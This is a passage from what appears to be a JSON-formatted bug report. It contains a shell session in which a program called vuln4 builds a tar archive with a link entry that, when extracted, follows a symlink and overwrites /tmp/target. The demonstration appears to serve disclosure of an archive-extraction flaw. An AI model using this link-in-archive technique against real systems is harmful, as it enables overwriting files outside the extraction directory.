vuln4 vuln4.c ，  $ echo hello > /tmp/target ，  $ echo goodbye > data ，  $ ln -s /tmp/target sym ，  $ ./vuln4 x.tar data p sym ，  $ tar tvf x.tar ， -rwxrwxrwx 0 0 0 8 Jan 1 1970 p link to sym ，  $ tar xvf x.tar ， x p ，  $ cat /tmp/target ， goodbye",
    "time": "Tue, 9 Aug 2016 13:08:23 -0700"
}